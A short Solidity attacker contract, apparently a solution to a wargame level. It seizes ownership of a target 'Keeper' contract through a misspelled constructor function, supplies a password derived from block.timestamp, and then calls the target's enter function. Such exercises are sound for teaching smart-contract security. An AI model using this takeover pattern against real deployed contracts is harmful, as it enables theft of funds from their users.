pragma solidity 0.8.0;

interface Keeper {

    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint) external;
    function enter() external returns (bool);

}

contract Key {
    address public owner;
    modifier onlyOwner {
        require(msg.sender == owner, "cino");
        _;
    }
    constructor() {
        owner = msg.sender;
    }

    function getOwnership(Keeper _keeper) external onlyOwner {
        _keeper.construct0r();
        
    }

    function getAllowance(Keeper keeper) external onlyOwner  {
        keeper.createTrick();
        uint pw = block.timestamp;
        keeper.getAllowance(pw);    
        
    }
    function payAndEnter(Keeper keeper) external payable onlyOwner  {
        keeper.enter();
        

    }

  
}
